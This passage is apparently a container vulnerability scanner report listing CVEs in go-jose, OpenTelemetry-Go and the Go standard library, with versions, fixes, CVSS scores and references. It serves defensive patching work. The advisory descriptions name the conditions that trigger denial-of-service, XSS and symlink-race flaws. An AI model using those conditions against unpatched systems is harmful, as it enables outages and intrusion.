│     │      │                   (JWE), JSON Web Signature (JWS), and JSON Web Token (JWT) standards. Prior to
│     │      │                   4.1.4 and 3.0.5, decrypting a JSON Web Encryption (JWE) object will panic if
│     │      │                   the alg field indicates a key wrapping algorithm (one ending in KW, with the
│     │      │                   exception of A128GCMKW, A192GCMKW, and A256GCMKW) and the encrypted_key field
│     │      │                   is empty. The panic happens when cipher.KeyUnwrap() in key_wrap.go attempts to
│     │      │                    allocate a slice with a zero or negative length based on the length of the
│     │      │                   encrypted_key. This code path is reachable from ParseEncrypted() /
│     │      │                   ParseEncryptedJSON() / ParseEncryptedCompact() followed by Decrypt() on the
│     │      │                   resulting object. Note that the parse functions take a list of accepted key
│     │      │                   algorithms. If the accepted key algorithms do not include any key wrapping
│     │      │                   algorithms, parsing will fail and the application will be unaffected. This
│     │      │                   panic is also reachable by calling cipher.KeyUnwrap() directly with any
│     │      │                   ciphertext parameter less than 16 bytes long, but calling this function
│     │      │                   directly is less common. Panics can lead to denial of service. This
│     │      │                   vulnerability is fixed in 4.1.4 and 3.0.5. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-248 
│     │      ├ VendorSeverity   ╭ alma       : 3 
│     │      │                  ├ amazon     : 3 
│     │      │                  ├ ghsa       : 3 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ redhat     : 3 
│     │      │                  ╰ rocky      : 3 
│     │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                  │        ╰ V3Score : 7.5 
│     │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                           ╰ V3Score : 7.5 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:10135 
│     │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-34986 
│     │      │                  ├ [2] : https://bugzilla.redhat.com/2455470 
│     │      │                  ├ [3] : https://bugzilla.redhat.com/show_bug.cgi?id=2455470 
│     │      │                  ├ [4] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-34986 
│     │      │                  ├ [5] : https://errata.almalinux.org/9/ALSA-2026-10135.html 
│     │      │                  ├ [6] : https://errata.rockylinux.org/RLSA-2026:10135 
│     │      │                  ├ [7] : https://github.com/go-jose/go-jose 
│     │      │                  ├ [8] : https://github.com/go-jose/go-jose/security/advisories/GHSA-78h2-9frx-2
│     │      │                  │       jm8 
│     │      │                  ├ [9] : https://linux.oracle.com/cve/CVE-2026-34986.html 
│     │      │                  ├ [10]: https://linux.oracle.com/errata/ELSA-2026-10135.html 
│     │      │                  ├ [11]: https://nvd.nist.gov/vuln/detail/CVE-2026-34986 
│     │      │                  ├ [12]: https://pkg.go.dev/github.com/go-jose/go-jose/v4#pkg-constants 
│     │      │                  ╰ [13]: https://www.cve.org/CVERecord?id=CVE-2026-34986 
│     │      ├ PublishedDate   : 2026-04-06T17:17:11.87Z 
│     │      ╰ LastModifiedDate: 2026-05-04T15:20:44.337Z 
│     ├ [3]  ╭ VulnerabilityID : CVE-2026-29181 
│     │      ├ VendorIDs        ─ [0]: GHSA-mh2q-q3fh-2475 
│     │      ├ PkgID           : go.opentelemetry.io/otel@v1.39.0 
│     │      ├ PkgName         : go.opentelemetry.io/otel 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/go.opentelemetry.io/otel@v1.39.0 
│     │      │                  ╰ UID : f50db78db91ece5c 
│     │      ├ InstalledVersion: v1.39.0 
│     │      ├ FixedVersion    : 1.41.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-29181 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:9e34a8ff0a3d03931f200208d04894aa081c38b2b4ab67cff3550de3781f5778 
│     │      ├ Title           : OpenTelemetry-Go: multi-value `baggage` header extraction causes excessive
│     │      │                   allocations (remote dos amplification) 
│     │      ├ Description     : OpenTelemetry-Go is the Go implementation of OpenTelemetry. From 1.36.0 to
│     │      │                   1.40.0, multi-value baggage: header extraction parses each header field-value
│     │      │                   independently and aggregates members across values. This allows an attacker to
│     │      │                    amplify cpu and allocations by sending many baggage: header lines, even when
│     │      │                   each individual value is within the 8192-byte per-value parse limit. This
│     │      │                   vulnerability is fixed in 1.41.0. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-770 
│     │      ├ VendorSeverity   ─ ghsa: 3 
│     │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                         ╰ V3Score : 7.5 
│     │      ├ References       ╭ [0]: https://github.com/open-telemetry/opentelemetry-go 
│     │      │                  ├ [1]: https://github.com/open-telemetry/opentelemetry-go/commit/aa1894e09e3fe6
│     │      │                  │      6860c7885cb40f98901b35277f 
│     │      │                  ├ [2]: https://github.com/open-telemetry/opentelemetry-go/pull/7880 
│     │      │                  ├ [3]: https://github.com/open-telemetry/opentelemetry-go/releases/tag/v1.41.0 
│     │      │                  ├ [4]: https://github.com/open-telemetry/opentelemetry-go/security/advisories/G
│     │      │                  │      HSA-mh2q-q3fh-2475 
│     │      │                  ╰ [5]: https://nvd.nist.gov/vuln/detail/CVE-2026-29181 
│     │      ├ PublishedDate   : 2026-04-07T21:17:16.003Z 
│     │      ╰ LastModifiedDate: 2026-04-14T18:45:01.363Z 
│     ├ [4]  ╭ VulnerabilityID : CVE-2026-32280 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4947 
│     │      ├ PkgID           : stdlib@v1.25.8 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.25.8 
│     │      │                  ╰ UID : d7d9624bed3e4b65 
│     │      ├ InstalledVersion: v1.25.8 
│     │      ├ FixedVersion    : 1.25.9, 1.26.2 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-32280 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:55ce854d080e0fed2b9834c706e8470a24ef12acd4b62837614648f0b25c0b40 
│     │      ├ Title           : crypto/x509: crypto/tls: golang: Go: Denial of Service vulnerability in
│     │      │                   certificate chain building 
│     │      ├ Description     : During chain building, the amount of work that is done is not correctly
│     │      │                   limited when a large number of intermediate certificates are passed in
│     │      │                   VerifyOptions.Intermediates, which can lead to a denial of service. This
│     │      │                   affects both direct users of crypto/x509 and users of crypto/tls. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-770 
│     │      ├ VendorSeverity   ╭ alma       : 3 
│     │      │                  ├ amazon     : 3 
│     │      │                  ├ bitnami    : 3 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ redhat     : 3 
│     │      │                  ╰ rocky      : 3 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 7.5 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                            ╰ V3Score : 7.5 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:14200 
│     │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-32280 
│     │      │                  ├ [2] : https://bugzilla.redhat.com/2456336 
│     │      │                  ├ [3] : https://bugzilla.redhat.com/2456338 
│     │      │                  ├ [4] : https://bugzilla.redhat.com/2456339 
│     │      │                  ├ [5] : https://bugzilla.redhat.com/show_bug.cgi?id=2456336 
│     │      │                  ├ [6] : https://bugzilla.redhat.com/show_bug.cgi?id=2456338 
│     │      │                  ├ [7] : https://bugzilla.redhat.com/show_bug.cgi?id=2456339 
│     │      │                  ├ [8] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32280 
│     │      │                  ├ [9] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32282 
│     │      │                  ├ [10]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32283 
│     │      │                  ├ [11]: https://errata.almalinux.org/9/ALSA-2026-14200.html 
│     │      │                  ├ [12]: https://errata.rockylinux.org/RLSA-2026:11514 
│     │      │                  ├ [13]: https://go.dev/cl/758320 
│     │      │                  ├ [14]: https://go.dev/issue/78282 
│     │      │                  ├ [15]: https://groups.google.com/g/golang-announce/c/0uYbvbPZRWU 
│     │      │                  ├ [16]: https://linux.oracle.com/cve/CVE-2026-32280.html 
│     │      │                  ├ [17]: https://linux.oracle.com/errata/ELSA-2026-14200.html 
│     │      │                  ├ [18]: https://nvd.nist.gov/vuln/detail/CVE-2026-32280 
│     │      │                  ├ [19]: https://pkg.go.dev/vuln/GO-2026-4947 
│     │      │                  ╰ [20]: https://www.cve.org/CVERecord?id=CVE-2026-32280 
│     │      ├ PublishedDate   : 2026-04-08T02:16:03.247Z 
│     │      ╰ LastModifiedDate: 2026-04-16T19:16:42.18Z 
│     ├ [5]  ╭ VulnerabilityID : CVE-2026-32281 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4946 
│     │      ├ PkgID           : stdlib@v1.25.8 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.25.8 
│     │      │                  ╰ UID : d7d9624bed3e4b65 
│     │      ├ InstalledVersion: v1.25.8 
│     │      ├ FixedVersion    : 1.25.9, 1.26.2 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : nvd 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-32281 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:50abbd8d8eb43c270feb24bb324865d25a2f8931ee982723f8c0227fda62af4a 
│     │      ├ Title           : crypto/x509: golang: Go crypto/x509: Denial of Service via inefficient
│     │      │                   certificate chain validation 
│     │      ├ Description     : Validating certificate chains which use policies is unexpectedly inefficient
│     │      │                   when certificates in the chain contain a very large number of policy mappings,
│     │      │                    possibly causing denial of service. This only affects validation of otherwise
│     │      │                    trusted certificate chains, issued by a root CA in the VerifyOptions.Roots
│     │      │                   CertPool, or in the system certificate pool. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-295 
│     │      ├ VendorSeverity   ╭ amazon : 3 
│     │      │                  ├ bitnami: 3 
│     │      │                  ├ nvd    : 3 
│     │      │                  ╰ redhat : 2 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 7.5 
│     │      │                  ├ nvd     ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 7.5 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                            ╰ V3Score : 5.9 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-32281 
│     │      │                  ├ [1]: https://go.dev/cl/758061 
│     │      │                  ├ [2]: https://go.dev/issue/78281 
│     │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/0uYbvbPZRWU 
│     │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-32281 
│     │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-4946 
│     │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-32281 
│     │      ├ PublishedDate   : 2026-04-08T02:16:03.35Z 
│     │      ╰ LastModifiedDate: 2026-04-16T19:15:57.75Z 
│     ├ [6]  ╭ VulnerabilityID : CVE-2026-32283 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4870 
│     │      ├ PkgID           : stdlib@v1.25.8 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.25.8 
│     │      │                  ╰ UID : d7d9624bed3e4b65 
│     │      ├ InstalledVersion: v1.25.8 
│     │      ├ FixedVersion    : 1.25.9, 1.26.2 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : nvd 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-32283 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:1763c0248192f4ef47c8936da0242cc66f638ac0dd1a95abc09608cb4429b78c 
│     │      ├ Title           : crypto/tls: golang: Go crypto/tls: Denial of Service via multiple TLS 1.3 key
│     │      │                   update messages 
│     │      ├ Description     : If one side of the TLS connection sends multiple key update messages
│     │      │                   post-handshake in a single record, the connection can deadlock, causing
│     │      │                   uncontrolled consumption of resources. This can lead to a denial of service.
│     │      │                   This only affects TLS 1.3. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-770 
│     │      ├ VendorSeverity   ╭ alma       : 3 
│     │      │                  ├ amazon     : 3 
│     │      │                  ├ bitnami    : 3 
│     │      │                  ├ nvd        : 3 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ redhat     : 3 
│     │      │                  ╰ rocky      : 3 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 7.5 
│     │      │                  ├ nvd     ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 7.5 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                            ╰ V3Score : 7.5 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:14200 
│     │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-32283 
│     │      │                  ├ [2] : https://bugzilla.redhat.com/2456336 
│     │      │                  ├ [3] : https://bugzilla.redhat.com/2456338 
│     │      │                  ├ [4] : https://bugzilla.redhat.com/2456339 
│     │      │                  ├ [5] : https://bugzilla.redhat.com/show_bug.cgi?id=2456336 
│     │      │                  ├ [6] : https://bugzilla.redhat.com/show_bug.cgi?id=2456338 
│     │      │                  ├ [7] : https://bugzilla.redhat.com/show_bug.cgi?id=2456339 
│     │      │                  ├ [8] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32280 
│     │      │                  ├ [9] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32282 
│     │      │                  ├ [10]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32283 
│     │      │                  ├ [11]: https://errata.almalinux.org/9/ALSA-2026-14200.html 
│     │      │                  ├ [12]: https://errata.rockylinux.org/RLSA-2026:11514 
│     │      │                  ├ [13]: https://go.dev/cl/763767 
│     │      │                  ├ [14]: https://go.dev/issue/78334 
│     │      │                  ├ [15]: https://groups.google.com/g/golang-announce/c/0uYbvbPZRWU 
│     │      │                  ├ [16]: https://linux.oracle.com/cve/CVE-2026-32283.html 
│     │      │                  ├ [17]: https://linux.oracle.com/errata/ELSA-2026-14200.html 
│     │      │                  ├ [18]: https://nvd.nist.gov/vuln/detail/CVE-2026-32283 
│     │      │                  ├ [19]: https://pkg.go.dev/vuln/GO-2026-4870 
│     │      │                  ╰ [20]: https://www.cve.org/CVERecord?id=CVE-2026-32283 
│     │      ├ PublishedDate   : 2026-04-08T02:16:03.58Z 
│     │      ╰ LastModifiedDate: 2026-04-16T19:12:10.54Z 
│     ├ [7]  ╭ VulnerabilityID : CVE-2026-32282 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4864 
│     │      ├ PkgID           : stdlib@v1.25.8 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.25.8 
│     │      │                  ╰ UID : d7d9624bed3e4b65 
│     │      ├ InstalledVersion: v1.25.8 
│     │      ├ FixedVersion    : 1.25.9, 1.26.2 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : nvd 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-32282 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:399f66fb980e6f76c03ce1b68997f958cc6f4af3f42dba1e2ccf109b1d50255c 
│     │      ├ Title           : golang: internal/syscall/unix: Root.Chmod can follow symlinks out of the root 
│     │      ├ Description     : On Linux, if the target of Root.Chmod is replaced with a symlink while the
│     │      │                   chmod operation is in progress, Chmod can operate on the target of the
│     │      │                   symlink, even when the target lies outside the root. The Linux fchmodat
│     │      │                   syscall silently ignores the AT_SYMLINK_NOFOLLOW flag, which Root.Chmod uses
│     │      │                   to avoid symlink traversal. Root.Chmod checks its target before acting and
│     │      │                   returns an error if the target is a symlink lying outside the root, so the
│     │      │                   impact is limited to cases where the target is replaced with a symlink between
│     │      │                    the check and operation. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-59 
│     │      ├ VendorSeverity   ╭ alma       : 3 
│     │      │                  ├ amazon     : 3 
│     │      │                  ├ bitnami    : 2 
│     │      │                  ├ nvd        : 2 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ redhat     : 2 
│     │      │                  ╰ rocky      : 3 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H 
│     │      │                  │         ╰ V3Score : 6.4 
│     │      │                  ├ nvd     ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H 
│     │      │                  │         ╰ V3Score : 6.4 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H 
│     │      │                            ╰ V3Score : 7.8 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:14200 
│     │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-32282 
│     │      │                  ├ [2] : https://bugzilla.redhat.com/2456336 
│     │      │                  ├ [3] : https://bugzilla.redhat.com/2456338 
│     │      │                  ├ [4] : https://bugzilla.redhat.com/2456339 
│     │      │                  ├ [5] : https://bugzilla.redhat.com/show_bug.cgi?id=2456336 
│     │      │                  ├ [6] : https://bugzilla.redhat.com/show_bug.cgi?id=2456338 
│     │      │                  ├ [7] : https://bugzilla.redhat.com/show_bug.cgi?id=2456339 
│     │      │                  ├ [8] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32280 
│     │      │                  ├ [9] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32282 
│     │      │                  ├ [10]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32283 
│     │      │                  ├ [11]: https://errata.almalinux.org/9/ALSA-2026-14200.html 
│     │      │                  ├ [12]: https://errata.rockylinux.org/RLSA-2026:11514 
│     │      │                  ├ [13]: https://go.dev/cl/763761 
│     │      │                  ├ [14]: https://go.dev/issue/78293 
│     │      │                  ├ [15]: https://groups.google.com/g/golang-announce/c/0uYbvbPZRWU 
│     │      │                  ├ [16]: https://linux.oracle.com/cve/CVE-2026-32282.html 
│     │      │                  ├ [17]: https://linux.oracle.com/errata/ELSA-2026-14200.html 
│     │      │                  ├ [18]: https://nvd.nist.gov/vuln/detail/CVE-2026-32282 
│     │      │                  ├ [19]: https://pkg.go.dev/vuln/GO-2026-4864 
│     │      │                  ╰ [20]: https://www.cve.org/CVERecord?id=CVE-2026-32282 
│     │      ├ PublishedDate   : 2026-04-08T02:16:03.467Z 
│     │      ╰ LastModifiedDate: 2026-04-16T19:15:39.4Z 
│     ├ [8]  ╭ VulnerabilityID : CVE-2026-32288 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4869 
│     │      ├ PkgID           : stdlib@v1.25.8 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.25.8 
│     │      │                  ╰ UID : d7d9624bed3e4b65 
│     │      ├ InstalledVersion: v1.25.8 
│     │      ├ FixedVersion    : 1.25.9, 1.26.2 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : nvd 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-32288 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:b471484408216c8194a7bb3d3ae16c180cc1511c853ffecd41878c722911cbd8 
│     │      ├ Title           : archive/tar: golang: Go's archive/tar package: Denial of Service via
│     │      │                   maliciously-crafted archive 
│     │      ├ Description     : tar.Reader can allocate an unbounded amount of memory when reading a
│     │      │                   maliciously-crafted archive containing a large number of sparse regions
│     │      │                   encoded in the "old GNU sparse map" format. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-770 
│     │      ├ VendorSeverity   ╭ amazon : 3 
│     │      │                  ├ azure  : 2 
│     │      │                  ├ bitnami: 2 
│     │      │                  ├ nvd    : 2 
│     │      │                  ├ photon : 3 
│     │      │                  ╰ redhat : 2 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 5.5 
│     │      │                  ├ nvd     ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 5.5 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:L 
│     │      │                            ╰ V3Score : 4.3 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-32288 
│     │      │                  ├ [1]: https://go.dev/cl/763766 
│     │      │                  ├ [2]: https://go.dev/issue/78301 
│     │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/0uYbvbPZRWU 
│     │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-32288 
│     │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-4869 
│     │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-32288 
│     │      ├ PublishedDate   : 2026-04-08T02:16:03.707Z 
│     │      ╰ LastModifiedDate: 2026-04-16T19:08:52.24Z 
│     ├ [9]  ╭ VulnerabilityID : CVE-2026-32289 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4865 
│     │      ├ PkgID           : stdlib@v1.25.8 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.25.8 
│     │      │                  ╰ UID : d7d9624bed3e4b65 
│     │      ├ InstalledVersion: v1.25.8 
│     │      ├ FixedVersion    : 1.25.9, 1.26.2 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : nvd 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-32289 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:ee5ddcd0a11cf1fa5df198dc51284ea3672c417f6474ba3ef776a90063929b4c 
│     │      ├ Title           : html/template: golang: html/template: Cross-Site Scripting (XSS) via improper
│     │      │                   context and brace depth tracking in JS template literals 
│     │      ├ Description     : Context was not properly tracked across template branches for JS template
│     │      │                   literals, leading to possibly incorrect escaping of content when branches were
│     │      │                    used. Additionally template actions within JS template literals did not
│     │      │                   properly track the brace depth, leading to incorrect escaping being applied.
│     │      │                   These issues could cause actions within JS template literals to be incorrectly
│     │      │                    or improperly escaped, leading to XSS vulnerabilities. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-79 
│     │      ├ VendorSeverity   ╭ amazon : 3 
│     │      │                  ├ bitnami: 2 
│     │      │                  ├ nvd    : 2 
│     │      │                  ├ photon : 4 
│     │      │                  ╰ redhat : 2 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N 
│     │      │                  │         ╰ V3Score : 6.1 
│     │      │                  ├ nvd     ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N 
│     │      │                  │         ╰ V3Score : 6.1 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N 
│     │      │                            ╰ V3Score : 5.4 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-32289 
│     │      │                  ├ [1]: https://go.dev/cl/763762 
│     │      │                  ├ [2]: https://go.dev/issue/78331 
│     │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/0uYbvbPZRWU 
│     │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-32289 
│     │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-4865 
│     │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-32289 
│     │      ├ PublishedDate   : 2026-04-08T02:16:03.82Z 
│     │      ╰ LastModifiedDate: 2026-04-16T19:06:57.367Z 
│     ├ [10] ╭ VulnerabilityID : CVE-2026-33811 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4981 
│     │      ├ PkgID           : stdlib@v1.25.8 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.25.8 
│     │      │                  ╰ UID : d7d9624bed3e4b65 
│     │      ├ InstalledVersion: v1.25.8 
│     │      ├ FixedVersion    : 1.25.10, 1.26.3 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-33811 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:519bce6793360dc9f3974aeb9da33e0db208395c4355d646c35f396774352a31 
│     │      ├ Title           : When using LookupCNAME with the cgo DNS resolver, a very long CNAME re ... 
│     │      ├ Description     : When using LookupCNAME with the cgo DNS resolver, a very long CNAME response
│     │      │                   can trigger a double-free of C memory and a crash. 
│     │      ├ Severity        : UNKNOWN 
│     │      ├ References       ╭ [0]: https://go.dev/cl/767860 
